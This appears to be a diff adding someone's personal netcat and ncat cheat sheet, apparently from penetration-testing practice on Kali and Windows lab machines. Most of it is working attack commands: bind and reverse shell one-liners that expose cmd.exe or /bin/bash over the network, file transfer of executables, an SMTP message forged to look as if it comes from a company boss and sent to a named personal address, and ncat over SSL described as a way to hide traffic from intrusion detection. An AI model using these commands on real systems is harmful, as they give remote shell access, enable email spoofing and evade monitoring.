@@ -1,0 +1,65 @@
+NETCAT (client and server) - to check if port is open
+
+nc -l 2389    -> in server mode
+
+nc localhost 2389    -> in client mode
+http://www.thegeekstuff.com/2012/04/nc-command-examples/?utm_source=feedburner
+
+To check if open port 110 on remote machine:
+Nc -nv 192.168.1.2 110 
+
+
+ncat -C 10.20.3.80 25 < mail3.txt
+Mail3.txt:
+		EHLO hostname
+		MAIL FROM: BOSS@patagonia.com
+		RCPT TO:   piotr.filosek@gmail.com
+		DATA
+		From: BOSS <BOSS@patagonia.com>
+		To:   <piotr.filosek@gmail.com>
+		Date: date
+		Subject: Be careful
+		
+		
+		.
+		QUIT
+
+NETCAT chat  :)
+#1 nc -nlvp 4444     ->server  TCP connection
+
+#2 nc -nv IP 4444      ->client
+
+NETCAT send file from client
+#1  nc -nlvp 4444 > incoming.exe   -> server nc, will download nc.exe file to server and put into incoming.exe
+
+#2 nc -nv 10.22.110.9 4444 <nc.exe  -> source file 
+
+
+
+BIND SHELL
+NETCAT like teamviewer:
+Tested from windows #1 nc -lvp 4444 -e cmd.exe   -> server nc, anyone who will connect with 4444 will gain cmd access
+
+Tested from kali (behind firewall)#2 nc -nv (IP of server) 4444
+
+
+
+REVERSHE SHELL
+NETCAT
+Difference -> server behind firewall
+Windows #1 nc -lvp 4444       -> that’s mean server
+
+Linux kali #2 nc -vn (IP of windows) 4444 -e /bin/bash      ->so client doing reverse shell, sending access into linux shell from windows machine
+
+
+NETCAT -send files
+nc -lvp 1234 > netcatfile
+nc 192.168.20.9 1234 < mydirectory/myfile
+
+NETCAT (nc) + SSL =ncat   -> to hide traffic,encrypt , hide for Intrusion detection system
+Ncat 
+
+On windows #1  ncat -lvp 4444 -e cmd.exe --allow 10.22.110.9  --ssl   (ip off kali)
+
+On kali linux #2 ncat -v 10.22.110.233 4444 --ssl
+Able to connect from kali #2 to #1 - secured ssl connection 
